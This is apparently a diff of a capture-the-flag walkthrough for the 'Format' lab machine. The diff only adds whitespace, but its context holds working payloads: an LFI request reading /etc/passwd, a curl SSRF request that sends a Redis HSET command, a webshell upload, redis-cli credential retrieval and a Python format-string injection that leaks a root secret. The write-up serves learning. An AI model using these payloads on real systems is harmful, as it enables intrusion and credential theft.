@@ -115,6 +115,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 -   the source code for `http://app.microblog.htb/` and `http://sunny.microblog.htb/` can be found at `http://microblog.htb:3000/cooper/microblog`
 -   The following code can be found in `/microblog/edit/index.php`, which allows us to add text to a created blog:
+    
     ```php
     if (isset($_POST['txt']) && isset($_POST['id'])) {
         chdir(getcwd() . "/../content");
@@ -130,6 +131,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     }
     ```
 -   The file name in which the content of the input field will be saved is passed via `$_POST['id']`. When a blog is accessed, the content is then read from the specified file name:
+    
     ```php
     function fetchPage() {
         chdir(getcwd() . "/content");
@@ -145,6 +147,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     -   `order.txt` contains all file names in the order in which the content is to be displayed on the blog page
     -   `file_get_contents($line)` outputs the content of each file within `order.txt`
 -   This makes **LFI (local file inclusion)** possible, but only if we do not have write access to the specified file, as we would otherwise overwrite it. The POST request after adding a new text field on the blog can be intercepted and manipulated with burpsuite. We can get the contents of the `/etc/passwd` by changing the POST parameters as follows:
+    
     ```
     id=/etc/passwd&txt=test
     ```
@@ -185,6 +188,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
         </details>
 - if we do have write permissions, we can also use this to create new files
 - The code shows that there are additional functions for so-called pro accounts. An additional `/uploads` directory is created for a blog of a pro user account, in which pro users are granted write permissions:
+    
     ```php
     function provisionProUser() {
         if(isPro() === "true") {
@@ -307,6 +311,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
         </details>
 - the nginx configuration reveals a misconfiguration, which allows us access the Redis socket through **SSRF (server-side request forgery)**:
+    
     ```yaml
         location ~ /static/(.*)/(.*) { 
 	        resolver 127.0.0.1; 
@@ -318,15 +323,18 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. After a user account (here: username `foo`) has been created, the **SSRF** vulnerability can be exploited to turn it into a pro user. To do this, we can send a forged [HSET request](https://redis.io/commands/hset/) to the Redis socket:
+    
     ```bash
     curl -X "HSET" /static/unix:%2Fvar%2Frun%2Fredis%2Fredis%2Esock:foo%20pro%20true%20/
     ```
     - nginx sets the placeholder for `proxy_pass` accordingly so that the following request is executed:
+        
         ```
         http://unix:/var/run/redis/redis.sock:foo pro true /.microbucket.htb/
         ```
     - the request therefore passes the HSET command `foo pro true` to `redis.sock`, making `foo` a pro user account
 2. If you now create a blog with the Pro account, the function `provisionProUser()` is executed, which creates the directory `/uploads` with write permissions. The **LFI** exploit can now be used to upload a webshell `cmd.php` in this directory, which enables commands to be executed via POST parameters. To do that, we can send the following POST request to `/edit`:
+    
     ```
     POST /edit/index.php HTTP/1.1
     Host: foo.microblog.htb
@@ -360,10 +368,12 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. We can use `redis-cli` to connect to the Redis database:
+    
     ```bash
     redis-cli -s /var/run/redis/redis.sock
     ```
 2. The password for the user `cooper` can be found in plain text in the database:
+    
     ```
     redis /var/run/redis/redis.sock> info
     ...
@@ -405,16 +415,19 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 - the `/etc/ssh/sshd_config` shows that `root` is allowed to log in via SSH:
 - `sudo -l` shows that `cooper` is allowed to execute the `license` binary as `root`:
+    
     ```
     User cooper may run the following commands on format:
         (root) /usr/bin/license
     ```
 - `binwalk license` shows that it is a Python script that can be exploited via the `str.format()` method:
+    
     ```python
     license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
     ```
     - https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string
 - The Python source code also contains a suspicious variable `secret`:
+    
     ```python
     secret = [line.strip() for line in open("/root/license/secret")][0]
     ```
@@ -425,6 +438,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     - username: `bar`
     - first name: `{license.init.globals[secret]}`
 2. The output of the command `sudo license -p bar` contains the value of the variable `secret`:
+    
     ```
     Plaintext license key:
     ------------------------------------------------------
